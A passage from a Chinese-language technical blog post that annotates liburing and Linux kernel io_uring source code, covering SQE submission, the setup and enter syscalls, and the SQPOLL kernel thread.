sq-&gt;ring_ptr + p-&gt;sq_off.ring_mask; sq-&gt;kring_entries = sq-&gt;ring_ptr + p-&gt;sq_off.ring_entries; // 设置sq entries个数 sq-&gt;kflags = sq-&gt;ring_ptr + p-&gt;sq_off.flags; // 设置对应标志 sq-&gt;kdropped = sq-&gt;ring_ptr + p-&gt;sq_off.dropped; if (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) sq-&gt;array = sq-&gt;ring_ptr + p-&gt;sq_off.array; // 如果存在sqarray cq-&gt;khead = cq-&gt;ring_ptr + p-&gt;cq_off.head; // 设置cq head指针 cq-&gt;ktail = cq-&gt;ring_ptr + p-&gt;cq_off.tail; // 设置cq tail指针 cq-&gt;kring_mask = cq-&gt;ring_ptr + p-&gt;cq_off.ring_mask; cq-&gt;kring_entries = cq-&gt;ring_ptr + p-&gt;cq_off.ring_entries; cq-&gt;koverflow = cq-&gt;ring_ptr + p-&gt;cq_off.overflow; cq-&gt;cqes = cq-&gt;ring_ptr + p-&gt;cq_off.cqes; if (p-&gt;cq_off.flags) cq-&gt;kflags = cq-&gt;ring_ptr + p-&gt;cq_off.flags; sq-&gt;ring_mask = *sq-&gt;kring_mask; sq-&gt;ring_entries = *sq-&gt;kring_entries; cq-&gt;ring_mask = *cq-&gt;kring_mask; cq-&gt;ring_entries = *cq-&gt;kring_entries;&#125; io_uring_get_sqe 此函数用来获取一个可用 sqe 用来提交任务，最终是调用了 _io_uring_get_sqe， 整个函数用非常优雅的方式实现了循环队列// #Elegant 123456789101112131415161718192021222324252627282930IOURINGINLINE struct io_uring_sqe *_io_uring_get_sqe(struct io_uring *ring)&#123; struct io_uring_sq *sq = &amp;ring-&gt;sq; unsigned int head, next = sq-&gt;sqe_tail + 1; int shift = 0; if (ring-&gt;flags &amp; IORING_SETUP_SQE128) shift = 1; if (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL)) head = IO_URING_READ_ONCE(*sq-&gt;khead); else head = io_uring_smp_load_acquire(sq-&gt;khead); // 通过原子读获取head // sq-&gt;khead = sq-&gt;ring_ptr + p-&gt;sq_off.head; // 这里实际上读的是共享内存的一个指针内存的 uint 值 if (next - head &lt;= sq-&gt;ring_entries) &#123; struct io_uring_sqe *sqe; sqe = &amp;sq-&gt;sqes[(sq-&gt;sqe_tail &amp; sq-&gt;ring_mask) &lt;&lt; shift]; // sq-&gt;ring_mask 来自kernel 设置的params // rings-&gt;sq_ring_mask = p-&gt;sq_entries - 1; // 由于sq_entries 为2的幂次倍 // 这里实际上就是一个循环队列的访问， sq-&gt;sqe_tail = next; return sqe; &#125; return NULL;&#125; io_uring_prep_xxx 这是一个系列函数, 用来实现 io_uring 提供的各种 io操作, 其根本实现是 设置 一个 sqe 结构体(这个结构体是内核的API), 这里以 io_uring_prep_openat 为例 1234567IOURINGINLINE void io_uring_prep_openat(struct io_uring_sqe *sqe, int dfd, const char *path, int flags, mode_t mode)&#123; io_uring_prep_rw(IORING_OP_OPENAT, sqe, dfd, path, mode, 0); sqe-&gt;open_flags = (__u32) flags;&#125; 12345678910111213141516171819202122IOURINGINLINE void io_uring_prep_rw(int op, struct io_uring_sqe *sqe, int fd, const void *addr, unsigned len, __u64 offset)&#123; sqe-&gt;opcode = (__u8) op; // 设置op为 open sqe-&gt;flags = 0 sqe-&gt;ioprio = 0; sqe-&gt;fd = fd; // 提供表示dir 的 -100 fd sqe-&gt;off = offset; // 0 sqe-&gt;addr = (unsigned long) addr; // 提供文件地址 sqe-&gt;len = len; sqe-&gt;rw_flags = 0; sqe-&gt;buf_index = 0; sqe-&gt;personality = 0; sqe-&gt;file_index = 0; sqe-&gt;addr3 = 0; sqe-&gt;__pad2[0] = 0;&#125; 归根结底就是设置了一个sqe 这里笔者有一个问题： #TODO 在IORING_SETUP_SQROLL时, io_uring用户和内核采用共享内存通信，内核态是如何知道一个sqe的全部参数已经设置完毕了，有没有可能用户态正在设置sqe的部分成员时，内核已经在处理这个sqe了？ 在之后 [[#__io_uring_flush_sq]] 笔者似乎找到了这个问题的答案： 通过 memory_store_release 保证sqe的更新不会被重排到 ktail 的修改前 通过 修改 ktail 表示真正提交了一个任务 io_uring_submit io_uring_submit 用于提交一个任务 1234int io_uring_submit(struct io_uring *ring)&#123; return __io_uring_submit_and_wait(ring, 0);&#125; 12345static int __io_uring_submit_and_wait(struct io_uring *ring, unsigned wait_nr)&#123; return __io_uring_submit(ring, __io_uring_flush_sq(ring), wait_nr, false);&#125; 最终到达 __io_uring_submit. 不过这个函数, 在SQPOLL模式下用处不大, 真正的提交操作应该说是在 __io_uring_flush_sq 中实现的. 这里主要是判断当前情况需不需要调用 io_uring_enter syscall. 如果当前 是IOPOLL模式, 就需要 io_uring_enter 来收割任务. 如果是 SQPOLL 模式， 且 内核处理线程已 idle ，那么就通过 io_uring_enter syscall 来唤醒 123456789101112131415161718192021static int __io_uring_submit(struct io_uring *ring, unsigned submitted, unsigned wait_nr, bool getevents)&#123; bool cq_needs_enter = getevents || wait_nr || cq_ring_needs_enter(ring); unsigned flags; int ret; flags = 0; if (sq_ring_needs_enter(ring, submitted, &amp;flags) || cq_needs_enter) &#123; if (cq_needs_enter) flags |= IORING_ENTER_GETEVENTS; if (ring-&gt;int_flags &amp; INT_FLAG_REG_RING) flags |= IORING_ENTER_REGISTERED_RING; ret = __sys_io_uring_enter(ring-&gt;enter_ring_fd, submitted, wait_nr, flags, NULL); &#125; else ret = submitted; return ret;&#125; __io_uring_flush_sq 主要用来更新内核sq 的tail指针， 最终返回需要提交的任务数 123456789101112131415161718192021static unsigned __io_uring_flush_sq(struct io_uring *ring)&#123; struct io_uring_sq *sq = &amp;ring-&gt;sq; unsigned tail = sq-&gt;sqe_tail; if (sq-&gt;sqe_head != tail) &#123; sq-&gt;sqe_head = tail; /* * Ensure kernel sees the SQE updates before the tail update. */ if (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL)) IO_URING_WRITE_ONCE(*sq-&gt;ktail, tail); // 原子读 else io_uring_smp_store_release(sq-&gt;ktail, tail); // memory_release 的内存序来写 &#125; */ return tail - *sq-&gt;khead;&#125; 在 SQPOLL 模式下,内核提交者可能同时在更新头指针。 对于非 SQPOLL 模式,应用自己更新头指针,不存在并发问题。 即使 SQPOLL 模式下,就算头指针读取是原子的,获取到的值也可能立即过期,存在并发修改的问题。 最坏情况下,读取的值会高估实际可提交的请求数。 在这里用到了一个原子写 IO_URING_WRITE_ONCE . 而 io_uring_smb_store_release 笔者涉及到内存序的问题，内存序是为了防止指令重排产生的，笔者还没有特别理解。 笔者尝试解释一下， 这里使用使用memory_order_release内存序标注这个存储操作 release内存序的特点是: 当前线程本地的修改对其他线程可见 防止存储操作被重新排序 这里应该是让此处对于sqe的修改，要在对于tail指针的修改前完成，防止指令重排的影响 如果是对于IOPOLL，内核的真正确认提交是在 io_uring_enter 实现的，其实是和当前处于同一个线程，因此不需要通过 memory_order_release 来保证 “当前线程本地的修改对其他线程可见”， 对同一线程的数据冒险应该是由旁路机制处理的 #TODO 123#define io_uring_smp_store_release(p, v) \\ atomic_store_explicit((_Atomic __typeof__(*(p)) *)(p), (v), \\ memory_order_release) syscall syscall是内核提供给用户态的接口，io_uring涉及三个syscall io_uring_setup(2) io_uring_enter(2) io_uring_register(2) 笔者这里主要讲述前两个syscall io_uring_setup 参数 entries: sq队列大小 params：提供的各种参数，许多返回值也会写入此结构体积 123456789101112131415161718192021222324252627static long io_uring_setup(u32 entries, struct io_uring_params __user *params)&#123; struct io_uring_params p; int i; if (copy_from_user(&amp;p, params, sizeof(p))) return -EFAULT; // 将params复制到内核空间 for (i = 0; i &lt; ARRAY_SIZE(p.resv); i++) &#123; if (p.resv[i]) return -EINVAL; &#125; if (p.flags &amp; ~(IORING_SETUP_IOPOLL | IORING_SETUP_SQPOLL | IORING_SETUP_SQ_AFF | IORING_SETUP_CQSIZE | IORING_SETUP_CLAMP | IORING_SETUP_ATTACH_WQ | IORING_SETUP_R_DISABLED | IORING_SETUP_SUBMIT_ALL | IORING_SETUP_COOP_TASKRUN | IORING_SETUP_TASKRUN_FLAG | IORING_SETUP_SQE128 | IORING_SETUP_CQE32 | IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_DEFER_TASKRUN | IORING_SETUP_NO_MMAP | IORING_SETUP_REGISTERED_FD_ONLY | IORING_SETUP_NO_SQARRAY)) return -EINVAL; // 如果有非法flag，直接返回 return io_uring_create(entries, &amp;p, params);&#125; 接下来是首先检查entries 和flags。 12345678910111213141516171819static __cold int io_uring_create(unsigned entries, struct io_uring_params *p, struct io_uring_params __user *params)&#123; struct io_ring_ctx *ctx; struct io_uring_task *tctx; struct file *file; int ret; if (!entries) return -EINVAL; if (entries &gt; IORING_MAX_ENTRIES) &#123; if (!(p-&gt;flags &amp; IORING_SETUP_CLAMP)) return -EINVAL; entries = IORING_MAX_ENTRIES; &#125; if ((p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY) &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP)) return -EINVAL; 设置sq_entries 以2的幂次向上取整， 这是为了方便环形队列的处理. 1234567891011121314151617181920p-&gt;sq_entries = roundup_pow_of_two(entries);if (p-&gt;flags &amp; IORING_SETUP_CQSIZE) &#123; /* * If IORING_SETUP_CQSIZE is set, we do the same roundup * to a power-of-two, if it isn&#x27;t already. We do NOT impose * any cq vs sq ring sizing. */ if (!p-&gt;cq_entries) return -EINVAL; if (p-&gt;cq_entries &gt; IORING_MAX_CQ_ENTRIES) &#123; if (!(p-&gt;flags &amp; IORING_SETUP_CLAMP)) return -EINVAL; p-&gt;cq_entries = IORING_MAX_CQ_ENTRIES; &#125; p-&gt;cq_entries = roundup_pow_of_two(p-&gt;cq_entries); if (p-&gt;cq_entries &lt; p-&gt;sq_entries) return -EINVAL;&#125; else &#123; p-&gt;cq_entries = 2 * p-&gt;sq_entries;&#125; 接下来是一系列设置ctx的代码，笔者暂且不在这里分析，之后遇见了再分析每一项 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273ctx = io_ring_ctx_alloc(p);if (!ctx) return -ENOMEM;if ((ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN) &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL)) ctx-&gt;task_complete = true;if (ctx-&gt;task_complete || (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL)) ctx-&gt;lockless_cq = true;/* * lazy poll_wq activation relies on -&gt;task_complete for synchronisation * purposes, see io_activate_pollwq() */if (!ctx-&gt;task_complete) ctx-&gt;poll_activated = true;/* * When SETUP_IOPOLL and SETUP_SQPOLL are both enabled, user * space applications don&#x27;t need to do io completion events * polling again, they can rely on io_sq_thread to do polling * work, which can reduce cpu usage and uring_lock contention. */if (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL)) ctx-&gt;syscall_iopoll = 1;ctx-&gt;compat = in_compat_syscall();if (!ns_capable_noaudit(&amp;init_user_ns, CAP_IPC_LOCK)) ctx-&gt;user = get_uid(current_user());/* * For SQPOLL, we just need a wakeup, always. For !SQPOLL, if * COOP_TASKRUN is set, then IPIs are never needed by the app. */ret = -EINVAL;if (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123; /* IPI related flags don&#x27;t make sense with SQPOLL */ if (ctx-&gt;flags &amp; (IORING_SETUP_COOP_TASKRUN | IORING_SETUP_TASKRUN_FLAG | IORING_SETUP_DEFER_TASKRUN)) goto err; ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;&#125; else if (ctx-&gt;flags &amp; IORING_SETUP_COOP_TASKRUN) &#123; ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;&#125; else &#123; if (ctx-&gt;flags &amp; IORING_SETUP_TASKRUN_FLAG &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN)) goto err; ctx-&gt;notify_method = TWA_SIGNAL;&#125;/* * For DEFER_TASKRUN we require the completion task to be the same as the * submission task. This implies that there is only one submitter, so enforce * that. */if (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER)) &#123; goto err;&#125;/* * This is just grabbed for accounting purposes. When a process exits, * the mm is exited and dropped before the files, hence we need to hang * on to this mm purely for the purposes of being able to unaccount * memory (locked/pinned vm). It&#x27;s not used for anything else. */mmgrab(current-&gt;mm);ctx-&gt;mm_account = current-&gt;mm; [[#io_allocate_scq_urings ]] 分配了scq和rings的内存 [[#io_sq_offload_create]] 创建了任务处理线程 1234567891011ret = io_allocate_scq_urings(ctx, p);if (ret) goto err;ret = io_sq_offload_create(ctx, p);if (ret) goto err;ret = io_rsrc_init(ctx);if (ret) goto err; 设置sq_off，即通过 params 返回给用户的 ring 中各个成员的偏移 1234567891011121314151617181920p-&gt;sq_off.head = offsetof(struct io_rings, sq.head);p-&gt;sq_off.tail = offsetof(struct io_rings, sq.tail);p-&gt;sq_off.ring_mask = offsetof(struct io_rings, sq_ring_mask);p-&gt;sq_off.ring_entries = offsetof(struct io_rings, sq_ring_entries);p-&gt;sq_off.flags = offsetof(struct io_rings, sq_flags);p-&gt;sq_off.dropped = offsetof(struct io_rings, sq_dropped);if (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) p-&gt;sq_off.array = (char *)ctx-&gt;sq_array - (char *)ctx-&gt;rings;p-&gt;sq_off.resv1 = 0;if (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP)) p-&gt;sq_off.user_addr = 0;p-&gt;cq_off.head = offsetof(struct io_rings, cq.head);p-&gt;cq_off.tail = offsetof(struct io_rings, cq.tail);p-&gt;cq_off.ring_mask = offsetof(struct io_rings, cq_ring_mask);p-&gt;cq_off.ring_entries = offsetof(struct io_rings, cq_ring_entries);p-&gt;cq_off.overflow = offsetof(struct io_rings, cq_overflow);p-&gt;cq_off.cqes = offsetof(struct io_rings, cqes);p-&gt;cq_off.flags = offsetof(struct io_rings, cq_flags);p-&gt;cq_off.resv1 = 0; 设置feature 1234567p-&gt;features = IORING_FEAT_SINGLE_MMAP | IORING_FEAT_NODROP | IORING_FEAT_SUBMIT_STABLE | IORING_FEAT_RW_CUR_POS | IORING_FEAT_CUR_PERSONALITY | IORING_FEAT_FAST_POLL | IORING_FEAT_POLL_32BITS | IORING_FEAT_SQPOLL_NONFIXED | IORING_FEAT_EXT_ARG | IORING_FEAT_NATIVE_WORKERS | IORING_FEAT_RSRC_TAGS | IORING_FEAT_CQE_SKIP | IORING_FEAT_LINKED_FILE | IORING_FEAT_REG_REG_RING; 再将params复制回用户空间 1234if (copy_to_user(params, p, sizeof(*p))) &#123; ret = -EFAULT; goto err;&#125; 最后是注册fd 12345678910111213141516171819202122232425if (ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED)) WRITE_ONCE(ctx-&gt;submitter_task, get_task_struct(current));file = io_uring_get_file(ctx);if (IS_ERR(file)) &#123; ret = PTR_ERR(file); goto err;&#125;ret = __io_uring_add_tctx_node(ctx);if (ret) goto err_fput;tctx = current-&gt;io_uring;/* * Install ring fd as the very last thing, so we don&#x27;t risk someone * having closed it before we finish setup */if (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY) ret = io_ring_add_registered_file(tctx, file, 0, IO_RINGFD_REG_MAX);else ret = io_uring_install_fd(file);if (ret &lt; 0) goto err_fput; 错误处理如下： 123456err: io_ring_ctx_wait_and_kill(ctx); return ret;err_fput: fput(file); return ret; io_allocate_scq_urings 首先是rings的分配，核心关键点在于NO_MMAP 的处理 1234567891011121314151617181920212223242526static __cold int io_allocate_scq_urings(struct io_ring_ctx *ctx, struct io_uring_params *p)&#123; struct io_rings *rings; size_t size, sq_array_offset; void *ptr; /* make sure these are sane, as we already accounted them */ ctx-&gt;sq_entries = p-&gt;sq_entries; ctx-&gt;cq_entries = p-&gt;cq_entries; size = rings_size(ctx, p-&gt;sq_entries, p-&gt;cq_entries, &amp;sq_array_offset); if (size == SIZE_MAX) return -EOVERFLOW; if (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP)) rings = io_mem_alloc(size); // 如果没有设置NO_MMAP，就分配 else rings = io_rings_map(ctx, p-&gt;cq_off.user_addr, size); // 反之，建立映射 if (IS_ERR(rings)) return PTR_ERR(rings); ctx-&gt;rings = rings; 接下来是类似的，sqe的分配： 123456789101112131415161718192021222324252627if (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) ctx-&gt;sq_array = (u32 *)((char *)rings + sq_array_offset);rings-&gt;sq_ring_mask = p-&gt;sq_entries - 1;rings-&gt;cq_ring_mask = p-&gt;cq_entries - 1;rings-&gt;sq_ring_entries = p-&gt;sq_entries;rings-&gt;cq_ring_entries = p-&gt;cq_entries;if (p-&gt;flags &amp; IORING_SETUP_SQE128) size = array_size(2 * sizeof(struct io_uring_sqe), p-&gt;sq_entries);else size = array_size(sizeof(struct io_uring_sqe), p-&gt;sq_entries);if (size == SIZE_MAX) &#123; io_rings_free(ctx); return -EOVERFLOW;&#125;if (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP)) ptr = io_mem_alloc(size);else ptr = io_sqes_map(ctx, p-&gt;sq_off.user_addr, size);if (IS_ERR(ptr)) &#123; io_rings_free(ctx); return PTR_ERR(ptr);&#125;ctx-&gt;sq_sqes = ptr; io_sq_offload_create 如果设置了 SQPOLL， 用来创建内核收割任务的线程 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091__cold int io_sq_offload_create(struct io_ring_ctx *ctx, struct io_uring_params *p)&#123; int ret; /* Retain compatibility with failing for an invalid attach attempt */ if ((ctx-&gt;flags &amp; (IORING_SETUP_ATTACH_WQ | IORING_SETUP_SQPOLL)) == IORING_SETUP_ATTACH_WQ) &#123; struct fd f; f = fdget(p-&gt;wq_fd); if (!f.file) return -ENXIO; if (!io_is_uring_fops(f.file)) &#123; fdput(f); return -EINVAL; &#125; fdput(f); &#125; if (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123; struct task_struct *tsk; struct io_sq_data *sqd; bool attached; ret = security_uring_sqpoll(); if (ret) return ret; sqd = io_get_sq_data(p, &amp;attached); // 获取一个sqd if (IS_ERR(sqd)) &#123; ret = PTR_ERR(sqd); goto err; &#125; ctx-&gt;sq_creds = get_current_cred(); ctx-&gt;sq_data = sqd; ctx-&gt;sq_thread_idle = msecs_to_jiffies(p-&gt;sq_thread_idle); if (!ctx-&gt;sq_thread_idle) ctx-&gt;sq_thread_idle = HZ; // 设置相关信息 io_sq_thread_park(sqd); list_add(&amp;ctx-&gt;sqd_list, &amp;sqd-&gt;ctx_list); io_sqd_update_thread_idle(sqd); /* don&#x27;t attach to a dying SQPOLL thread, would be racy */ ret = (attached &amp;&amp; !sqd-&gt;thread) ? -ENXIO : 0; io_sq_thread_unpark(sqd); if (ret &lt; 0) goto err; if (attached) return 0; if (p-&gt;flags &amp; IORING_SETUP_SQ_AFF) &#123; int cpu = p-&gt;sq_thread_cpu; ret = -EINVAL; if (cpu &gt;= nr_cpu_ids || !cpu_online(cpu)) goto err_sqpoll; sqd-&gt;sq_cpu = cpu; &#125; else &#123; sqd-&gt;sq_cpu = -1; &#125; sqd-&gt;task_pid = current-&gt;pid; sqd-&gt;task_tgid = current-&gt;tgid; tsk = create_io_thread(io_sq_thread, sqd, NUMA_NO_NODE); // 创建处理线程 if (IS_ERR(tsk)) &#123; ret = PTR_ERR(tsk); goto err_sqpoll; &#125; sqd-&gt;thread = tsk; ret = io_uring_alloc_task_context(tsk, ctx); wake_up_new_task(tsk); if (ret) goto err; &#125; else if (p-&gt;flags &amp; IORING_SETUP_SQ_AFF) &#123; /* Can&#x27;t have SQ_AFF without SQPOLL */ ret = -EINVAL; goto err; &#125; return 0;err_sqpoll: complete(&amp;ctx-&gt;sq_data-&gt;exited);err: io_sq_thread_finish(ctx); return ret;&#125; io_uring_enter 首先是对于flag的检查和确认，这里不一一赘述了，感兴趣的去看相应的man page更能了解 1234567891011121314151617181920212223242526272829303132333435363738394041SYSCALL_DEFINE6(io_uring_enter, unsigned int, fd, u32, to_submit, u32, min_complete, u32, flags, const void __user *, argp, size_t, argsz)&#123; struct io_ring_ctx *ctx; struct fd f; long ret; if (unlikely(flags &amp; ~(IORING_ENTER_GETEVENTS | IORING_ENTER_SQ_WAKEUP | IORING_ENTER_SQ_WAIT | IORING_ENTER_EXT_ARG | IORING_ENTER_REGISTERED_RING))) return -EINVAL; /* * Ring fd has been registered via IORING_REGISTER_RING_FDS, we * need only dereference our task private array to find it. */ if (flags &amp; IORING_ENTER_REGISTERED_RING) &#123; struct io_uring_task *tctx = current-&gt;io_uring; if (unlikely(!tctx || fd &gt;= IO_RINGFD_REG_MAX)) return -EINVAL; fd = array_index_nospec(fd, IO_RINGFD_REG_MAX); f.file = tctx-&gt;registered_rings[fd]; f.flags = 0; if (unlikely(!f.file)) return -EBADF; &#125; else &#123; f = fdget(fd); if (unlikely(!f.file)) return -EBADF; ret = -EOPNOTSUPP; if (unlikely(!io_is_uring_fops(f.file))) goto out; &#125; ctx = f.file-&gt;private_data; ret = -EBADFD; if (unlikely(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED)) goto out; SQPOLL模式下,直接返回提交数,可选择性wakeup线程 12345678910111213141516171819202122/* * For SQ polling, the thread will do all submissions and completions. * Just return the requested submit count, and wake the thread if * we were asked to. */ret = 0;if (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123; io_cqring_overflow_flush(ctx); if (unlikely(ctx-&gt;sq_data-&gt;thread == NULL)) &#123; ret = -EOWNERDEAD; goto out; &#125; if (flags &amp; IORING_ENTER_SQ_WAKEUP) // 这个flag处于和用户态共享的内存 // 如果sq处理线程休眠了，并需要唤醒 // 可以通过设置 IORING_ENTER_SQ_WAKEUP， 再通过此syscall 来唤醒 wake_up(&amp;ctx-&gt;sq_data-&gt;wait); if (flags &amp; IORING_ENTER_SQ_WAIT) io_sqpoll_wait_sq(ctx); ret = to_submit; 非SQPOLL模式,执行提交请求到SQ环 1234567891011121314151617181920212223242526&#125; else if (to_submit) &#123; ret = io_uring_add_tctx_node(ctx); if (unlikely(ret)) goto out; mutex_lock(&amp;ctx-&gt;uring_lock); ret = io_submit_sqes(ctx, to_submit); // 直接提交 sqes // 这个函数将在后面分析 // SQPOLL 模式下创建的io_sq_thread 也会调用此函数 if (ret != to_submit) &#123; mutex_unlock(&amp;ctx-&gt;uring_lock); goto out; &#125; if (flags &amp; IORING_ENTER_GETEVENTS) &#123; if (ctx-&gt;syscall_iopoll) goto iopoll_locked; /* * Ignore errors, we&#x27;ll soon call io_cqring_wait() and * it should handle ownership problems if any. */ if (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN) (void)io_run_local_work_locked(ctx); &#125; mutex_unlock(&amp;ctx-&gt;uring_lock);&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 if (flags &amp; IORING_ENTER_GETEVENTS) &#123; // 如果请求获取完成事件 int ret2; if (ctx-&gt;syscall_iopoll) &#123; // 如果开启了syscall轮询模式,执行iopoll逻辑 /* * We disallow the app entering submit/complete with * polling, but we still need to lock the ring to * prevent racing with polled issue that got punted to * a workqueue. */ mutex_lock(&amp;ctx-&gt;uring_lock);iopoll_locked: ret2 = io_validate_ext_arg(flags, argp, argsz); if (likely(!ret2)) &#123; min_complete = min(min_complete, ctx-&gt;cq_entries); ret2 = io_iopoll_check(ctx, min_complete); &#125; mutex_unlock(&amp;ctx-&gt;uring_lock); &#125; else &#123; const sigset_t __user *sig; struct __kernel_timespec __user *ts; ret2 = io_get_ext_arg(flags, argp, &amp;argsz, &amp;ts, &amp;sig); if (likely(!ret2)) &#123; min_complete = min(min_complete, ctx-&gt;cq_entries); ret2 = io_cqring_wait(ctx, min_complete, sig, argsz, ts); &#125; &#125; if (!ret) &#123; ret = ret2; /* * EBADR indicates that one or more CQE were dropped. * Once the user has been informed we can clear the bit * as they are obviously ok with those drops. */ if (unlikely(ret2 == -EBADR)) clear_bit(IO_CHECK_CQ_DROPPED_BIT, &amp;ctx-&gt;check_cq); &#125; &#125; 如果请求获取完成事件 如果开启了syscall轮询模式,执行iopoll逻辑 否则执行等待完成事件逻辑 kernel 最后是io_uring 内核的任务处理, 在这里先给出一个流程图, 然后再具体分析各个函数 图来自 https://zhuanlan.zhihu.com/p/380726590 , 侵删// io_sq_thread | 内核任务提交机制 io_sq_thread是 SQPOLL 模式下内核任务轮询线程. 首先设置线程环境 1234567891011121314151617181920static int io_sq_thread(void *data)&#123; struct io_sq_data *sqd = data; struct io_ring_ctx *ctx; unsigned long timeout = 0; char buf[TASK_COMM_LEN]; DEFINE_WAIT(wait); snprintf(buf, sizeof(buf), &quot;iou-sqp-%d&quot;, sqd-&gt;task_pid); set_task_comm(current, buf); /* reset to our pid after we&#x27;ve set task_comm, for fdinfo */ sqd-&gt;task_pid = current-&gt;pid; if (sqd-&gt;sq_cpu != -1) &#123; set_cpus_allowed_ptr(current, cpumask_of(sqd-&gt;sq_cpu)); &#125; else &#123; set_cpus_allowed_ptr(current, cpu_online_mask); sqd-&gt;sq_cpu = raw_smp_processor_id(); &#125; 接下来获取锁并进入无限循环 12mutex_lock(&amp;sqd-&gt;lock);while (1) &#123; 设置好timeout 123456if (io_sqd_events_pending(sqd) || signal_pending(current)) &#123; if (io_sqd_handle_event(sqd)) break; timeout = jiffies + sqd-&gt;sq_thread_idle; // sq_thread_idle 来自用户在 params 设置的时间&#125; 注意到这个线程创建在内存分配好之后， 即，即使是第一次进入此线程， 如果 sqes对应内存有任务，也会处理任务， 意味着在 io_uring_setup 之前，在sqes写好的任务，也可以被处理 1234567891011121314151617181920212223242526272829cap_entries = !list_is_singular(&amp;sqd-&gt;ctx_list);// 获取是否有多个io_ring的标记cap_entrieslist_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) &#123;// 遍历注册的io_ring,调用__io_sq_thread做实际的轮询操作 int ret = __io_sq_thread(ctx, cap_entries); if (!sqt_spin &amp;&amp; (ret &gt; 0 || !wq_list_empty(&amp;ctx-&gt;iopoll_list))) sqt_spin = true; // 如果有事件处理或iopoll任务,则设置sqt_spin标记&#125;if (io_run_task_work())// 调用io_run_task_work处理排队的工作任务 sqt_spin = true;if (sqt_spin || !time_after(jiffies, timeout)) &#123;// 如果有待处理事件或时间没超时 if (sqt_spin) timeout = jiffies + sqd-&gt;sq_thread_idle; // 如果有待处理事件,更新下一次超时时间 if (unlikely(need_resched())) &#123; // 检查是否需要调度,如果需要,主动释放并重新获取锁 mutex_unlock(&amp;sqd-&gt;lock); cond_resched(); mutex_lock(&amp;sqd-&gt;lock); sqd-&gt;sq_cpu = raw_smp_processor_id(); &#125; continue; // 没超时就直接continue， 因为之后就是判断是否需要阻塞&#125; 接下来实现io_uring SQ线程的阻塞和唤醒逻辑 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 prepare_to_wait(&amp;sqd-&gt;wait, &amp;wait, TASK_INTERRUPTIBLE); // 将当前线程设置为可中断状态TASK_INTERRUPTIBLE if (!io_sqd_events_pending(sqd) &amp;&amp; !task_work_pending(current)) &#123; bool needs_sched = true; // 检查是否有待处理事件和任务 list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) &#123; // 若没有则遍历所有注册的io_ring atomic_or(IORING_SQ_NEED_WAKEUP, &amp;ctx-&gt;rings-&gt;sq_flags); // 设置IORING_SQ_NEED_WAKEUP标志 if ((ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp; !wq_list_empty(&amp;ctx-&gt;iopoll_list)) &#123; // 检查iopoll和SQ队列是否为空 needs_sched = false; break; &#125; /* * Ensure the store of the wakeup flag is not * reordered with the load of the SQ tail */ smp_mb__after_atomic(); if (io_sqring_entries(ctx)) &#123; needs_sched = false; break; &#125; &#125; if (needs_sched) &#123; // 如果需要调度 mutex_unlock(&amp;sqd-&gt;lock); // 释放锁调度 schedule(); mutex_lock(&amp;sqd-&gt;lock); // 唤醒后重新获取锁和CPU信息 sqd-&gt;sq_cpu = raw_smp_processor_id(); &#125; list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) atomic_andnot(IORING_SQ_NEED_WAKEUP, &amp;ctx-&gt;rings-&gt;sq_flags); // 否则清除唤醒标记 &#125; finish_wait(&amp;sqd-&gt;wait, &amp;wait); timeout = jiffies + sqd-&gt;sq_thread_idle; // 更新等待时间&#125; 最后是退出无限循环时的清理机制 123456789io_uring_cancel_generic(true, sqd);sqd-&gt;thread = NULL;list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) atomic_or(IORING_SQ_NEED_WAKEUP, &amp;ctx-&gt;rings-&gt;sq_flags);io_run_task_work();mutex_unlock(&amp;sqd-&gt;lock);complete(&amp;sqd-&gt;exited);do_exit(0); __io_sq_thread 12345678910111213141516171819202122232425262728293031323334353637383940414243static int __io_sq_thread(struct io_ring_ctx *ctx, bool cap_entries)&#123; unsigned int to_submit; int ret = 0; to_submit = io_sqring_entries(ctx); /* if we&#x27;re handling multiple rings, cap submit size for fairness */ if (cap_entries &amp;&amp; to_submit &gt; IORING_SQPOLL_CAP_ENTRIES_VALUE) to_submit = IORING_SQPOLL_CAP_ENTRIES_VALUE; // 计算需要提交的任务数量 // 如果需要公平,则 cap 